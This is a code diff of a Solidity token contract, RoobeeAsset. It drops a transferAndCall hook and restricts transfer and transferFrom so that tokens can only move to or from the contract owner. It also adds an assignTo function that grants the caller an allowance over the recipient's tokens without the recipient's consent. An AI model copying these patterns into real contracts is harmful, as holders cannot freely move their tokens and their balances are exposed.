@@ -201,28 +201,27 @@ contract RoobeeAsset is ERC20Burnable, Ownable {
         symbol = _symbol;
     }
 
-
-    function transferAndCall(address _to, uint256 _value, string memory _extraData
-    ) public returns (bool success) {
-        transfer(_to, _value);
-        CallReceiver(_to).assetFallback(
-            msg.sender,
-            _value,
-            address(this),
-            _extraData
-        );
-        return true;
+    function transfer(address to, uint256 value) public returns (bool) {
+        require(isOwner()||to == owner());
+        return super.transfer(to, value);
     }
 
-    function mint(address _to ,uint _value) onlyOwner public {
-        _mint(_to, _value);
+    function transferFrom(address from, address to, uint256 value) public returns (bool) {
+        require(isOwner()||to == owner());
+        return super.transferFrom(from, to, value);
     }
 
-    function transferFromThis(address _to, uint _value) onlyOwner public {
-        _transfer(address(this), _to, _value);
+
+    // only for users without external wallets - temporary
+    function assignTo(address to, uint256 value)  public returns (bool) {
+        _approve(to, msg.sender, value);
+        return super.transfer(to, value);
     }
+
+
+    function mint(address to ,uint value) onlyOwner public {
+        _mint(to, value);
+    }
+
 }
 
-contract CallReceiver {
-    function assetFallback(address _from, uint256 _value, address _token, string memory _extraData) public ;
-}
